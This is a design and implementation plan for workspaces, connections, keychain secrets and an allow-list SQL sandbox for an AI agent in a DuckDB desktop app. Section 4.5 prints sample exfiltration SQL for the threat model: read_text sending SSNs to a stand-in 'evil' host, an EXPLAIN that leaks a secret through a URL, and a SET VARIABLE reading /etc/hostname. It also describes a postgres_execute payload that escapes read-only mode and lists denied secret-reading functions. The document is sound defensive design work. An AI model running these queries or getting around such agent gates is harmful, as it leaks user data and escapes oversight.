# Workspaces & Connections — implementation plan

**Status:** IMPLEMENTED · epic #105 merged (issues #106–#119) · originally accepted 2026-10-06 · owner decisions in §7 · v1 adversarially reviewed (Fable), findings in §9 · see "As built" below first
_Issue numbers in this document (#105 to #119 and below) are from the archived `SandwichLabs/vibe-app` repo._
**Supersedes:** `docs/direction.md` §1 "file is the app", §3.1 "Container unchanged", §3.2 "in-process data", §6 non-goal "no plaintext container"; CLAUDE.md *Design Principles* "File is the app" and "Encryption by default".

---

## As built (read this first)

The plan below was written before the work and is kept as the record of the reasoning. Where it and the code disagree, the code and the reference docs win. This is what to know.

**Shipped.** A workspace is a folder (`slaw.yaml`, `notebooks/*.slnb`, `queries/*.sql`, `skills/<name>/SKILL.md`, `data/`), opened from a launcher in Studio and by the CLI. `internal/session` is the DuckDB hub; connections attach into it lazily. Credentials live in the OS keychain or env vars (`internal/secrets`). The agent's SQL is an allow-list; `slaw mcp serve` and Studio share one owner per workspace; `.slaw` is a bundle. Reference docs: [workspaces](../reference/workspaces.md), [connections](../reference/connections.md), [agent policy](../reference/agent-policy.md), [notebooks](../reference/notebooks.md). North star: [`../direction.md`](../direction.md) (§9 lists the departures).

**Amendments to the plan** (the sections they replace are annotated "(as built)" or "(impl #N)" inline):
- **No legacy `.vibe` import (§4.6, D6, #110).** Dropped by owner decision on the epic. `internal/container` and `verify/compact/rekey/dump/passphrase` are gone, not retired later. A v1 or SQLCipher file gets a plain "not supported".
- **Agent policy (§4.5, D13, #116).** Parse-first, allow-listed readers, three-gate writes, always-approve for non-local connections, `list_connections` instead of `duckdb_databases()`, `SET VARIABLE` refused, relative paths refused. The "separate agent hub with external access off" in D13 was not built (#134).
- **Superseded 2026-11-07 (see `docs/direction.md` §9): metadata-driven formats are no longer own-scope only, and the Iceberg and Delta readers are agent readers.** The text below is the original #119 decision, kept for the record. Original: **Metadata-driven formats are own-scope only (#119).** `ducklake`, `iceberg` and `delta` definitions are refused in a committed `slaw.yaml`. Iceberg and Delta readers are not agent readers in any tier. Related rule, **parse before EXPLAIN**: the agent's statement is checked syntactically first, and nothing is sent to `EXPLAIN` (which binds the statement, and for some readers fetches URLs while binding) until that check has passed.
- **Trust boundary of the folder.** A committed `slaw.yaml` can only tighten the agent, its `credentials:` line is a hint only, `${VAR}` and absolute paths are refused in it, per-person settings live outside the folder keyed by id and real path, and every `sign_in` is bound to the definition's fingerprint so a pulled commit cannot redirect a saved password.
- **MotherDuck (D10).** Cannot be attached read-only (`READ_ONLY` unsupported on `md:`); the token is set at hub open, and testing a MotherDuck connection runs in a subprocess because one process holds one token.
- **Bundles (D2, §4.6, #118).** Optional encryption is age (scrypt passphrase), not a hand-rolled envelope. A bundle never carries credentials or data.
- **Packaging (§5 Slice 3, D12).** The app-side wiring is built: launch arguments, macOS `OnFileOpen`, `Info.plist` document types, Linux `.desktop` and MIME, `slaw workspace info` showing the DuckDB version and extensions ([`../packaging.md`](../packaging.md) §1a). `.desktop` does not claim `inode/directory`.

**Open follow-ups.**
- #134: a safe agent path for Iceberg and Delta (confined hub, or Go-side validation).
- #123: auto-number gap off-by-one after reopening a file.
- MotherDuck verified against a real token (so far only the spike, fakes and the hidden child process).
- Iceberg REST catalogs. DuckLake with a Postgres or SQLite metadata catalog.
- Removing a downloaded extension (Studio only installs).
- Dead code sweep: done in #137 (the SQLite stores and the `_vibe_*` helpers are deleted).
- #77: signing and notarisation, CI and release pipeline, bundled-extension decision (D12), the keychain check on signed builds.
- #73: notebook export to HTML, PDF and xlsx.

---

## 1. The shift in one paragraph

Vibe stops being *a file that holds your data* and becomes *a desktop workspace that points at your data* — the DataGrip / DBeaver shape, plus the agent, notebooks, skills and A2UI artifacts we already have. Data stays resident in **connections** (local DuckDB files, MotherDuck, Postgres, SQLite, object storage, files on disk — anything DuckDB can `ATTACH` or read through an extension). A **workspace** is a folder you open like an Obsidian vault; its notebooks, saved queries, skills and secret-free connection definitions are plain files, so the folder can be a git repo shared with a team. **Credentials live in the OS keychain**, never in the folder. The `.vibe` file survives as an **exchange format** for notebooks/queries/skills and as the legacy format we import from — not as a data container.

Unchanged: one agent tool surface (`internal/agents` ToolDefs → `internal/llm` + `internal/mcp`), notebooks / A2UI / skills, task-mode authoring, guardrails, SchoolHouse theming, DuckDB as the single engine.

## 2. What existed before the work (the seams)

Everything hangs off one `container.Container` (`internal/container/container.go:14`), which owns **both** a SQLCipher metadata DB and a materialised DuckDB blob.

| Concern | Today | Coupling |
|---|---|---|
| Data | `_vibe_duckdb` blob → temp file → `sql.Open("duckdb")` (`container/duckdb.go:51`) | `engine.NewManager(c.DuckDBDB())`, single DB |
| Notebooks | `_vibe_notebooks` | `notebooks.DB` (SQL-shaped interface) |
| Queries | `_vibe_queries` | `queries.DB` (SQL-shaped interface) |
| Skills | `_vibe_skills` | `agents.LoadSkills(sqliteDB, duckDB)` raw handles |
| Sandbox | `_vibe_meta.agent_sandbox` (default `read-write`, `agents.DefaultSandboxMode`) + `agent_ask_before_writes` approval gate, on by default (#79) | per file |
| LLM key | `~/.slaw.yaml` / `SLAW_LLM_*` — **plaintext** | `internal/config` |
| Agent | `agents.Handler{container ContainerAccess, engine}` | `.DuckDBDB()` / `.SQLiteDB()` |
| Studio | `App.container`, ~50 `a.container == nil` gates, `sessionID`; dirty flag / Save / Revert (#81, #98) | `OpenFile`/`CreateFile`, `UnlockView` |
| Locking | one writer per `.vibe` via `flock` on `<file>.lock`, holder named (`internal/container/lock*.go`, #80) | per file |
| MCP | `slaw mcp serve <file.slaw>` | one file |
| CLI | `init/info/import/export/dump/verify/compact/rekey` all take `<file>` | |

**Single-catalog assumption:** `'main'` is hard-coded at **22 sites** (as of #104) — `engine/columns.go:41`, `engine/autonumber.go:65,104`, `crud/crud.go:60`, `container/autonumber.go:26,64`, `importer/import.go:295,312,337`, `tui/tables.go:41`, `agents/handler.go:399,424`, `agents/skills.go:70,373,609`, `agents/empty_result.go:149`, `studio/app.go:641,1036,1128,2149`, `studio/schema_designer.go:167`, `cmd/info.go:84`. A2UI `sql` bindings (`internal/a2ui/schema.go:92-96`, `RunA2UIQuery`), notebook SQL cells, starter templates (`container/templates.go`), the importer, and table-bound skills (`agents/skills.go:148`) all assume one unqualified catalog.

No keyring, connection model, or ATTACH flow exists. `sql_classify.go` buckets `ATTACH`/`INSTALL`/`COPY` as full-only, and in `full` applies **no additional restriction**.

**What #104 changes about the plan:** the per-file save model (dirty flag, Save / Don't save, Revert, "Save, then do it") exists because data lived in a temp copy of a blob. Once data stays in its source, writes are the source's own transactions: there is nothing to Save and nothing to Revert for connection data — the dirty/save/revert machinery shrinks to the legacy importer and notebooks. The #79 approval gate and #80 holder-naming `flock` are **kept and reused** (workspace hub lock, §4.4; write approvals, §4.5). Per-action undo (#99) becomes source-dependent and is deferred.

## 3. Prior art: duck-tape

`../duck-tape` has ~200 lines of connection code. **Port:** DuckDB as hub (every backend `ATTACH`ed into one session → free cross-source joins); connection name = catalog alias; `read_only` by default; saved queries reference connections **by name**, never by config; and from its unbuilt PRD (`docs/PRD-schema-intelligence.md`): workspace marker found by walk-up like `.git`, `${ENV}` interpolation that hard-errors when missing, "secrets never logged or cached", and **prepare-based SQL validation + a fingerprinted schema cache** (§1, §5) — exactly what catalog-aware completion (#84) and the agent's `preview_query` need against slow remotes.
**Don't port:** plaintext DSNs in a 0644 YAML that are also logged (`connection.go:22`, `cmd/connections.go:20`); `fmt.Sprintf` ATTACH with no quoting (`database.go:115`); re-running INSTALL/LOAD/ATTACH on every pooled connection with all errors swallowed (`cmd/database.go:115-140`); `Type` doubling as extension name (`HTTPSFS` is invalid); viper case-folding names; no list/test/remove.

## 4. Target model

### 4.1 Workspace = folder

```
acme-analytics/                 ← the workspace; may be a git repo
├── slaw.yaml                   # committed marker + config: id, name, default_connection,
│                               #   agent sandbox ceiling, shared connection DEFINITIONS (no secrets)
├── notebooks/
│   └── weekly-revenue.slnb      # one per file; pretty JSON; stable cell ids; per-cell connection
├── queries/
│   └── top-customers.sql       # SQL + header frontmatter (-- slaw: {connection: prod_pg, params: …})
├── skills/
│   └── revenue-definitions/SKILL.md   # same format as built-ins (Claude Code compatible)
├── data/                       # local files (csv/parquet/xlsx) and local .duckdb files
├── .gitattributes              # *.slnb text eol=lf
├── .gitignore                  # .slaw-local/, data/*.duckdb, data/*.duckdb.wal
└── .slaw-local/                # never committed; non-trust state only (review #109: per-person trust-bearing settings moved out of the folder, see §4.2)
    ├── state.json              # open tabs, last notebook
    ├── hub.lock                # flock held by the owning process + its MCP endpoint (§4.4)
    └── scratch/<pid>/          # per-process DuckDB temp_directory
```

- **Naming:** the marker is `slaw.yaml` at the root (not a `.slaw/` dir) so it can't be confused with the `.slaw` exchange file in discovery, file associations, or people's heads.
- **Discovery:** CLI and `slaw mcp serve` walk up from `cwd` to the nearest `slaw.yaml`; `--workspace` overrides. Studio opens folders from a launcher / recent list.
- **Identity:** `slaw.yaml` carries a generated `id` (committed). Keychain entries are keyed by it, so **clones of the same repo on one machine share credentials** — intended. A `cp -r` duplicate is detected on open (id already registered at another live path in prefs) and offered *Regenerate id*.
- **Files are the source of truth.** Stores do **compare-and-write** (mtime + content hash captured at load); a stale write returns `ErrConflict` that the caller surfaces ("changed on disk — reload / overwrite / save as copy"). This stops `slaw mcp serve`'s `write_cell` silently clobbering unsaved Studio edits. An `fsnotify` watcher (non-recursive on Linux → register each dir, incl. `skills/<name>/`) reloads changes from git pulls, editors, Claude Code, other processes.
- **Git-friendly serialisation:** `SetEscapeHTML(false)`, 2-space indent, stable key order and cell ids, trailing newline; outputs never persisted. Closes UX-panel T5. v1 git UI = branch/dirty indicator only; commit/push stays in the user's git tool. *New workspace* offers `git init` when `git` is on PATH.

### 4.2 Connections

```yaml
# slaw.yaml (committed — no secrets, no per-person identity)
id: 7f3c…
name: Acme Analytics
default_connection: local
sandbox: read-only
connections:
  - name: prod_pg            # catalog alias: prod_pg.public.orders
    type: postgres
    host: db.internal
    port: 5432
    database: analytics
    read_only: true          # default true
    credentials: keychain    # keychain | env:PREFIX | prompt
    options: { sslmode: require }
  - name: lake
    type: s3                 # storage "connection" = scoped CREATE SECRET, no catalog
    region: us-east-1
    scope: s3://acme-lake/
    credentials: keychain
  - name: local
    type: duckdb
    path: data/local.duckdb
    read_only: false
```

- **Per-person fields live with the secret.** `user`/`password`, S3 key id/secret, MotherDuck token are one JSON credential blob per connection in the keychain (or `env:PG_PROD` → `PG_PROD_USER`, `PG_PROD_PASSWORD`). Committed config never carries a username.
- **(design #106) Only secrets are write-only.** Per-person *non-secret* fields (username, S3 key id) are readable and shown in the UI; password, token and secret key are write-only. Redacted errors keep `user='rosa'` and hide only the password. The credential status binding returns `{method, username/keyId, secretSet, fingerprintMatches}`, never a secret.
- **(review #115) A shared `credentials:` line is only a hint, and every sign-in is fingerprint-bound.** The effective method comes only from the per-person `sign_in` (default keychain; an empty keychain is needs-credentials); the committed `credentials:` may pre-select it in the UI and nothing else. Each `sign_in` entry, env included, stores the definition fingerprint it was made for (`sign_in_fingerprint`); a mismatch is `ErrFingerprintChanged` and the credential is withheld. (A committed `env:PG_PROD` plus a chosen host was a credential-exfiltration path.)
- **(review #115) MotherDuck cannot be read-only.** `READ_ONLY` is unsupported on `md:`; `read_only: true` is rejected ("use a read-scaling token for read-only access") and the MotherDuck default is `read_only: false`. `attach_mode=single` does not exist as a URL parameter in the extension (#163): `ATTACH 'md:db'` already attaches only that database.
- **(design #106) Sign-in method is per person.** The committed definition says what a connection *needs* (its fields). The method (`keychain` / `env:PREFIX` / ask each time) is chosen per person and stored in the per-person local file (review #109: `<config dir>/slaw/workspaces/<id>-<hash>/local.yaml`, outside the folder) or the user-scope file for user connections, so the `credentials:` line above is the default suggestion, not a shared setting. MotherDuck gets all three (env = an explicit `MOTHERDUCK_TOKEN`, spike finding H). A connection's scope can be changed after creation (UI: Team / This computer / All my workspaces); the credential stays bound to workspace id + name + fingerprint. New connections default to **This computer** (local scope); Team is an explicit choice.
- **(design #106) Status precedence** when several apply: `extension-missing` > `needs-credentials` > `error` > `locked-by` > `not connected` > `ok`. Scope precedence is most-specific-wins (local beats shared beats user); a user entry never overrides.
- **Scopes, merged most-specific-wins:** user-global (`~/.config/slaw/connections.yaml`) → workspace shared (`slaw.yaml`) → workspace local (`.slaw-local/connections.yaml`). The UI shows each connection's scope and any shadowing.
- **(review #109) Trust-bearing per-person settings never live inside the workspace folder.** The local scope is `<config dir>/slaw/workspaces/<workspace-id>-<hash of the real root path>/local.yaml` (honouring `SLAW_CONFIG_DIR`, next to `connections.yaml` and the prefs). It holds the agent loosening, `sign_in` per connection and "This computer" connection definitions. A cloned repository can commit anything under `.slaw-local/`, and these settings can loosen the agent, redefine connections and redirect credential lookup, so a `.slaw-local/connections.yaml` inside the folder is never read (opening reports a warning). `.slaw-local/` keeps only non-trust state: `state.json`, `scratch/`, `hub.lock`. The hash in the directory name keeps two clones of one repo (same id) independent.
- **(review #109) Interpolation and paths by scope.** `${ENV}` is not interpolated in the shared `slaw.yaml` at all (a committed reference is a parse error); it is allowed only in your own scopes (local, user), where a variable named like a credential is still refused. Shared-scope paths must be relative and stay inside the workspace after symlink resolution; absolute paths are allowed only in your own scopes, and Slaw never creates a folder outside the workspace.
- **Type registry** (`internal/connections/types`): each type declares required extensions, fields (secret / per-person flags), secret-SQL emitter, attach-SQL emitter, capabilities. **Rule: a DSN or credential never appears in the `ATTACH` string** — always `ATTACH '' AS x (TYPE …, SECRET s)` — so `duckdb_databases().path` can't leak it.

  | Type | v1? | Mechanism |
  |---|---|---|
  | `duckdb` (file) | ✅ | `ATTACH 'path' AS x (READ_ONLY?)` |
  | `postgres` | ✅ | `CREATE TEMPORARY SECRET (TYPE postgres …)`; `ATTACH '' AS x (TYPE postgres, SECRET s, READ_ONLY)` |
  | `motherduck` | ✅ | see §4.4 *MotherDuck constraints* — token at session open; `ATTACH 'md:db' AS x` |
  | `sqlite` | ✅ | `ATTACH 'path' AS x (TYPE sqlite)` |
  | `s3` / `gcs` / `r2` | ✅ | scoped `CREATE TEMPORARY SECRET`; no catalog |
  | `mysql`, `azure`, `ducklake`, `iceberg`/`delta` | later | same patterns |

  Every identifier/literal goes through one tested quoting helper. Names match `^[a-z_][a-z0-9_]{0,62}$`.
- **(impl #115) Built.** `internal/connections` registers the types on the session seam (`CredentialedType`, `CataloglessType`, `HubTokenType`); lazy attach triggers on `Session.Connect`, a qualified `Resolve`, and `ConnectReferenced` (engine.Manager runs it before every statement); sqlite and duckdb attach eagerly. MotherDuck gets its token through `session.WithMotherDuckToken` at hub open (ambient env scrubbed first); a changed account or a late extension install sets `RelaunchRequired`. Postgres `sslmode` rides in the ATTACH string (not accepted by the secret). See `docs/reference/connections.md`.
- **Lazy attach.** Opening a workspace dials nothing. Connections show *not connected* until first expand / first query referencing the alias / explicit Connect. Status: `ok | error(redacted msg) | needs-credentials | extension-missing | locked-by(pid)`. Never swallowed.
- **Test** = secret + attach + probe in a throwaway in-memory DuckDB, 10 s timeout, redacted error. (MotherDuck can't be tested in-process if the hub already holds a different token — Test runs in a short-lived subprocess for MD.)

### 4.3 Secrets (`internal/secrets`)

```go
type Store interface {
    Get(ctx context.Context, ref Ref) ([]byte, error) // ErrNotFound distinct
    Set(ctx context.Context, ref Ref, value []byte) error
    Delete(ctx context.Context, ref Ref) error
}
type Ref struct{ Scope, Owner, Name string } // {"workspace", "<ws-id>", "prod_pg"} | {"user", "", "md"} | {"app", "", "llm"}
```

- **Keyring** via `zalando/go-keyring` (macOS Keychain — shells out to `/usr/bin/security`, so signed/notarised builds must be tested in #77; Windows Credential Manager; Linux Secret Service — GNOME yes, KDE via kwallet ≥ 5.97, SSH / agent shells / `wails dev` from an agent often **no**).
- **`env:` is first-class**, not a fallback — it's the dev-loop, CI and headless path. `prompt` holds values in memory for the session (D9: may offer "remember in keychain").
- **No plaintext-file fallback.** Missing keychain → clear *needs-credentials* status naming the `env:` alternative.
- **Write-only across boundaries.** The Wails bridge, MCP and agent tools can set / clear / ask *is-set*; never read back.
- **LLM API key moves to the keychain** (`SLAW_LLM_API_KEY` env still wins); one-time migration offers to move and blank the plaintext value in `~/.slaw.yaml`.
- **Never logged.** `slog.LogValuer` on connection types; a redactor strips known secret values and `password=`/`token=` patterns from DuckDB errors before logs/UI/agent. **(spike #107)** The redactor is mandatory, not defensive: DuckDB's Postgres connect errors (wrong password, unreachable host, rotated password) echo `password='<value>'` verbatim, e.g. `Unable to connect to Postgres at user='…' password='…' host='…'`; key the redactor on `password='…'` plus the literal secret values. Secret DDL can't be parameterised, so it runs on a **dedicated non-logging path** — `engine.Manager` currently logs every statement at Debug (`internal/engine/engine.go:58`).
- **(design #106) Credentials are bound to a fingerprint** of (type, host, port, database / bucket scope), stored with the keychain entry. If a pull changes any of them, the connection becomes *needs-credentials* ("the server changed since you signed in") instead of sending a saved password to a different server. Keychain entries are keyed by workspace id + connection name + fingerprint.

### 4.4 Session — the DuckDB hub (`internal/session`)

Verified against the embedded engine (go-duckdb v2.4.3 → **DuckDB v1.4.1**): `ATTACH` and `CREATE TEMPORARY SECRET` are instance-level (visible across pooled `*sql.Conn`s); `USE` is per-connection.

- **One in-memory DuckDB per workspace, in one process.** It holds no user data; connections attach into it. `ATTACH`/secret DDL run once under a session mutex on a dedicated conn (not in a per-connection connector init, unlike duck-tape). Connector init only does `USE <default>`.
- **Hardening set at open via the connector DSN** (spike #107 confirmed all six are accepted as DSN query params): `allow_persistent_secrets=false`, `autoinstall_known_extensions=false`, `autoload_known_extensions=false`, `allow_community_extensions=false`, `temp_directory=.slaw-local/scratch/<pid>`. **(spike #107)** Only `allow_persistent_secrets` becomes immutable once the secret manager is used; the others still accept `SET`. So put them in the DSN rather than in a per-connection init `SET` (a pooled second connection would fail on `allow_persistent_secrets`). LIST options such as `allowed_directories` cannot go in the DSN. Then `lock_configuration=true` after open-time `SET`s, and last of them: it blocks every later `SET`, including MotherDuck's `SET motherduck_token`. **Note:** `lock_configuration` blocks `SET`/`PRAGMA` only — it does **not** block `ATTACH`/`DETACH`/`CREATE SECRET`. The SQL policy (§4.5) is the only gate on those for user/agent SQL; session-owned lazy attaches work after lock with no special path.
- **Single hub per workspace (resolves DuckDB's file lock).** DuckDB allows one read-write process *or* many read-only processes per `.duckdb` file — never a mix (tested: `READ_ONLY` attach fails while another process holds RW). So:
  - Studio owns the hub: it takes the #80-style non-blocking `flock` on `.slaw-local/hub.lock` (crash-safe, names app/pid/host) and records its local MCP endpoint (port + token; port persisted per UX-panel T11) next to it.
  - `slaw mcp serve` tries the lock: if a live Studio holds it, it **proxies stdio ⇄ Studio's MCP server** (today it only *suggests* Studio's server, #80); otherwise it owns the hub itself. Studio opening a workspace owned by a live `mcp serve` offers *Open read-only* (local `duckdb` connections attached RO is impossible while the other holds RW → those show `locked-by(pid)`; remote connections work) or *Take over* (signals the server to release). **(#112, built)** The signal is `SIGUSR1`, sent only to a same-host holder whose `hub.lock` advertises `control: sigusr1` with the flock verified held; the server closes its session, releases the lock and exits 0 (it does not become a proxy: the client reconnects, and the new `slaw mcp serve` proxies to Studio). `hub.lock` is read for the same user only (0600, owner uid, flock held, loopback http). An owner over stdio also publishes loopback SSE so a second headless client proxies to it. Implemented in `internal/hub`.
  - This replaces v1's "fall back to read-only" idea, which doesn't work, and also implements #97.
- **MotherDuck constraints (spike #107 corrected the token mechanism):** `CREATE SECRET (TYPE motherduck)` does **not** exist on 1.4.1 ("Secret type 'motherduck' not found"), `motherduck_token` is **not** a connector/DSN option (rejected at open until the extension is loaded), and a token inside the `md:` connection string is ignored. What works: the `motherduck_token` env var, or `INSTALL`+`LOAD motherduck` then `SET motherduck_token='…'` on the instance before the first `ATTACH` and before `lock_configuration` (the value reads back `<redacted>`). Prefer the `SET` (env leaks into children). **Hazard (spike #107):** `ATTACH 'md:…'` with no token anywhere starts an interactive browser SSO flow and blocks ~60 s, so the session must resolve *needs-credentials* before dialling and never attach `md:` without a `SET` token. **One MotherDuck configuration per process** (a second token fails) and `attach_mode=single` behaviour are still **unverified** (need a real token; `TestSpikeMotherDuckRealToken` is written for a token holder). So: the session resolves the MD credential at open (keychain read, no network), MD attach uses `attach_mode=single` so one connection = one catalog (default *workspace mode* attaches every DB in the account), and at most one MD account per workspace. Switching to a workspace with a different MD token → Studio offers a relaunch (D10). MD has no `windows_arm64` build and lags DuckDB releases — pin go-duckdb and bump only once MD supports the new version (D12).
- **Hub hygiene (spike #107 review):** pin an app-private `extension_directory` (the user's `~/.duckdb/extensions` may already hold loadable `excel`, `ui`, `vss`, `fts`, httpfs and `postgres_scanner`, which would widen the agent surface). Some DSN options are silently ignored (`secret_directory` is accepted but reads back the default; it needs `SET`), so the session **reads back every hardening option after open and fails closed**. An ambient `MOTHERDUCK_TOKEN`/`motherduck_token` env var is picked up at `LOAD motherduck` and is invisible to `current_setting`: unset both before `LOAD`, or treat them as an explicit `env:` source. MotherDuck's SSO prints to process stdout and tries to open a browser, which under `slaw mcp serve` corrupts the stdio JSON-RPC stream, so `md:` is never attempted without a token.
- **(impl #108) Session and the legacy container.** `internal/session` is built: a hardened `Session` with `Query/Exec/Conn` (timeout, row cap, pinned `USE`), `Register/Attach/Connect/Detach`, `Connections()` (status precedence of §4.2), `ListCatalogs/Schemas/Tables`, `DescribeTable`, a fingerprinted schema cache and the quoting helpers; the connection-type registry (`session.ConnectionType`, only `duckdb` file for now) is the seam #115 extends. Hardening is read back and fails closed (`session.Wrap` refuses an instance that was not opened with `session.OpenDB`). **Transition:** the legacy container *wraps* its own DuckDB instance (`Container.Session()`; default catalog `analytics`, the temp file's stem) instead of routing Save/Revert through the session; `session.New()` (in-memory, owns its instance) is what #109's workspace uses. `lock_configuration` now blocks `SET`/`PRAGMA` writes on the container's DuckDB too.
- **Catalog-aware API:** `Query/Exec` (cancellable, per-connection statement timeout + row cap), `Connections() []Status`, `Attach/Detach(name)`, introspection filtered by `database_name`, with a **fingerprinted schema cache** (duck-tape PRD) so `information_schema`/`SUMMARIZE` against remote Postgres aren't repeated round-trips. **(spike #107)** Measured against ~500 PG tables: table listing costs 2 server statements per call (columns 0, `DESCRIBE`/`EXPLAIN` 0) and 4–20 ms locally, so the cache is a modest win for listings; the real cost is **data access**: `SUMMARIZE` (and any scan) is a full-table `COPY`. The PG catalog is cached by DuckDB and goes stale after external DDL until `CALL pg_clear_cache()` (session-issued, not agent), which the cache's refresh must call. Filter `pg_catalog`/`information_schema` out of listings. All Postgres `ATTACH` goes through `SECRET` only: on a hardened hub an inline connection string is rejected (with a misleading *Unknown secret storage 'local_file'* the session must translate), and an inline attach would put the password in `duckdb_databases().path`.
- **Keychain (spike #107):** every `go-keyring` call runs in a goroutine with a ~5 s timeout: a locked login collection with no GUI prompter blocks forever in the library (no timeout) *(from source, not reproduced)*. Any non-`ErrNotFound` error (including an unreachable bus) → *needs-credentials / keychain unavailable*. godbus falls back to `/run/user/<uid>/bus`, so SSH sessions of a logged-in user work without `DBUS_SESSION_BUS_ADDRESS`. macOS (source only): `/usr/bin/security`, secret via stdin, 4096-byte cap, no app signature needed.
- **Extensions:** `allow_community_extensions=false` gates `LOAD`, not `INSTALL` **(spike #107)**; explicit install with consent per type ("Install postgres extension"), status in Settings; install happens before hardening-sensitive steps. Pre-bundling for offline is a packaging decision (D12).

### 4.5 Agent, SQL policy, MCP

> **(as built, #116)** `docs/reference/agent-policy.md` is the shipped policy. Choices the plan left open: `SET VARIABLE` is refused entirely (not "inner query classified"); `duckdb_databases()` is refused (use `list_connections`, which has no paths) rather than allowed through a projection; relative paths are refused (DuckDB resolves them against the working directory), so file reads are literal absolute paths inside `data/`; the plan-operator list is the second layer after the AST/token check, and remote catalog scans pass by their `Table` entry (`POSTGRES_SCAN`), with DML operators matched by pattern (`PG_INSERT`, ...); "local" means a `duckdb` or `sqlite` connection, everything else always needs approval; a DML/DDL statement's target catalogs come from its SQL (EXPLAIN's plan does not name the target).

> **(review #115, for #116)** The `motherduck` extension registers functions of its own (MotherDuck table and scalar functions: remote query passthrough, sharing and database management) beside the ones the policy lists. Once a MotherDuck workspace has loaded it, the allow-list must name what is allowed and deny the rest; do not assume the 1.4.1 core function list. Remote catalog scans (`POSTGRES_SCAN` and the like) are also absent from the plan-operator allow-list today, which is why `run_query` over MCP on `pg.*` is refused; deciding that is #116.

- `agents.Handler` takes two narrow interfaces — `Workspace` (notebook/query/skill stores) and `Session` (query/exec/catalog/connections) — replacing `ContainerAccess`. Tools keep names; data tools accept catalog-qualified names and default to `default_connection`.
- New/changed tools: `list_connections` (name, type, status, read_only — no DSNs/secrets), `introspect_schema(connection?)`, catalog-aware `describe_table`; `import_csv` / `bulk_insert` / DDL target a writable connection (default `local`).
- **Policy inverts from deny-list to allow-list.** With prod connections and httpfs loaded, today's `full` lets the agent exfiltrate via URL (`read_text('https://evil/?d=' || (SELECT string_agg(ssn) …))`) without any write. New tiers:
  - `read-only`: `SELECT`/`WITH`/`DESCRIBE`/`SHOW`/`SUMMARIZE`/`EXPLAIN` over attached catalogs; table functions only from an allow-list; file reads only inside the workspace `data/`; URL reads only inside a configured storage connection's `scope`.
  - `read-write`: + DML on catalogs whose connection is writable.
  - `full`: + DDL on writable catalogs, `COPY … TO` inside `data/`.
  - **File-read surfaces the classifier must treat as reads (spike #107):** every `read_*` / `parquet_*` / `sniff_csv` / `glob` table function, **bare replacement scans** (`FROM 'x.csv'`, `FROM 'x.parquet'` read a file with no function call), `COPY … FROM/TO`, `EXPORT DATABASE`, and `ATTACH 'file'`. All work unrestricted through CTEs, temp macros and temp views, hence the plan-operator allow-list. SQL-from-string table functions `query`, `query_table`, `json_execute_serialized_sql` are denied. `SUMMARIZE` on a remote catalog is a full-table transfer: row-cap it or refuse it; `DESCRIBE` is catalog-only.
  - **Never, in any tier:** `ATTACH`/`DETACH`/`USE` of new catalogs, `CREATE/DROP SECRET`, `SET`/`RESET`/`PRAGMA` writes (`SET VARIABLE` allowed), `INSTALL`/`LOAD`, `EXPORT/IMPORT DATABASE`, `CALL` outside an allow-list, raw-SQL passthroughs (`postgres_query`/`postgres_execute`/`postgres_scan`, `mysql_*`, `sqlite_*` — they bypass the classifier, and **(spike #107)** `postgres_execute` does escape `READ_ONLY`: a single statement runs in a `READ ONLY` transaction and fails, but a multi-statement payload such as `ROLLBACK; CREATE TABLE …` or `COMMIT; …` created tables on the server in 4 of 5 attempts; `postgres_scan` takes an inline DSN with the password), MotherDuck sharing (`CREATE SHARE`, `md_create_share`, `ATTACH 'md:_share/…'`), `duckdb_secrets()`, `which_secret()`, `duckdb_settings()`, `current_setting`, `getenv`. `duckdb_databases()` allowed via a projection without `path`.
  - **Agent SQL pre-check (spike #107 review, shapes #116):**
    - **Syntactic AST check first.** Run a `json_serialize_sql` AST pre-check *before* any `EXPLAIN`. Binding has side effects: `EXPLAIN SELECT * FROM read_csv('https://…/leak?q=secret')` sniffs the file and sends an HTTP HEAD, so the classifier's own EXPLAIN can exfiltrate.
    - **`EXPLAIN ANALYZE` executes** the statement (INSERT, CTAS and `COPY TO` all ran). Deny it, or classify by its inner statement.
    - **Paths can be computed** (`getvariable`, concatenation inside `query('…')`, lists), and EXPLAIN never shows paths. "File reads only inside `data/`" therefore needs AST checks that accept literal paths only, or no agent file readers at all. EXPLAIN does reveal operators inside `query('…')`.
    - **`SET VARIABLE` runs subqueries** (`SET VARIABLE v=(SELECT content FROM read_text('/etc/hostname'))` worked), so it is not blanket-allowed: classify its inner query.
    - **More file-read forms:** `DESCRIBE`/`SHOW`/`SUMMARIZE`/`PIVOT`/`UNPIVOT` on `'<file>'`; CTAS and `INSERT … FROM 'f'`; `CALL read_text`/`CALL glob`; `COPY FROM DATABASE`; `LOAD '<path>'` and `INSTALL '<path>'` with arbitrary paths. `read_csv` globs work; a bare `FROM 'glob*'` fails.
    - **More table functions to name:** core `read_ndjson_auto`, `read_ndjson_objects`, `read_json_objects_auto`, `parquet_bloom_probe`, `duckdb_variables`, `duckdb_external_file_cache`, `duckdb_temporary_files`, `sql_auto_complete`; extension-provided `read_xlsx`, `st_read`/`st_read_meta`, `iceberg_*`, `delta_scan`, `sqlite_*`, `mysql_*`, ducklake.
    - **`postgres_query` is denied outright:** besides reads of server metadata it can call side-effecting functions (`pg_sleep`, `pg_terminate_backend`).
    - **`READ_ONLY` is client-side only.** Docs steer users to read-only database roles for production connections.
  - Keep the EXPLAIN plan-operator allow-list (catches views/macros wrapping denied functions).
  - **Write = sandbox tier allows it AND the connection is writable AND the user approves it.** Default for new workspaces (D8): tier `read-write` with the #79 *Ask before changes* gate **forced on for any connection that isn't local** — the agent reads freely; every write is an explicit approval. Headless MCP has no approver, so writes there need the owner to turn the gate off for that workspace (local connections only) or to run through Studio's proxy.
  - **(design #106) The committed `slaw.yaml` is a ceiling, not a switch.** The committed `sandbox` and `ask_before_writes` can only *tighten* what the agent may do (§4.1: the `sandbox` key is the team limit). Loosening (turning the gate off, raising the tier) is stored per person in the local file outside the folder (review #109; never in `.slaw-local/`), so a pulled commit can never disable anyone's safeguards.
- **Defence in depth (D13):** DuckDB's own `enable_external_access=false` + `allowed_directories` is a real file sandbox (tested) but is per-instance, irreversible, blocks `INSTALL`, and blocks httpfs entirely — so it can't sit on a hub with S3 connections. **(spike #107)** Details: `allowed_directories` is `SET`-only (not DSN) and must be set *before* `enable_external_access=false`; `ATTACH` of a new remote catalog is refused after lockdown ("Attaching Postgres databases is disabled through configuration") while catalogs attached *before* lockdown keep working, so the second-hub option is only viable as an eager hub (all non-file connections attached first, no lazy attach, no `data/`, no storage connections). v1 = classifier + plan allow-list on the shared hub; follow-up option = a second agent-only hub with external access off for workspaces without storage connections.
